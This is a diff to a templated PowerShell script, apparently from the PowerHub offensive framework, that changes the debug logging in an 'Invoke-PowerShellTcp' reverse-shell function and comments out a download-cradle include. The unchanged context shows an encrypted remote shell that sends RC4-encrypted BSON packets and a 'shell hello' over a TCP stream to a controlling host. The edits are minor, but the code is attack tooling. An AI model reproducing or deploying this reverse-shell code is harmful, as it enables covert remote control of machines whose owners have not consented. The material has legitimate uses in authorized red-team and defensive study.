@@ -4,7 +4,7 @@
 
 $KEY = ([system.Text.Encoding]::UTF8).GetBytes("{{key}}")
 $DL_CRADLE = @'
-{% include "powershell/powerhub.ps1" %}
+{#{% include "powershell/powerhub.ps1" %}#}
 '@
 
 {% include "powershell/rc4.ps1" %}
@@ -168,7 +168,7 @@ function Invoke-PowerShellTcp
         $body = $enc_packet_length
         $body += $bytes[0 .. ($len-5)]
         $body = Decrypt-Code $body $KEY
-        {{'Write-Debug "Read: $($enc.getstring($body))"'|debug}}
+        {{'Write-Debug "Read:`r`n$($enc.getstring($body)|format-hex)"'|debug}}
         $result = ConvertFrom-Bson $body
         return $result
     }
@@ -180,7 +180,7 @@ function Invoke-PowerShellTcp
         )
         $body = [byte[]](ConvertTo-Bson $Packet)
 
-        {{'Write-Debug "Sending:  $($enc.getstring($body))"'|debug}}
+        {{'Write-Debug "Sending:`r`n$($enc.getstring($body)|format-hex)"'|debug}}
         $body = Decrypt-Code $body $KEY
         $Stream.Write($body, 0, $body.length)
         $Stream.Flush()
@@ -321,7 +321,9 @@ function Invoke-PowerShellTcp
         $stream = $client.GetStream()
         # this the shell hello
         $shell_hello = [byte[]](0x21,0x9e,0x10,0x55,0x75,0x6a,0x1a,0x6b)
+        {{'Write-Debug "$($shell_hello|format-hex)"'|debug}}
         $shell_hello = Decrypt-Code $shell_hello $KEY
+        {{'Write-Debug "$($shell_hello|format-hex)"'|debug}}
         $stream.Write($shell_hello, 0, $shell_hello.length)
         [byte[]]$bytes = 0..1024|%{0}
 
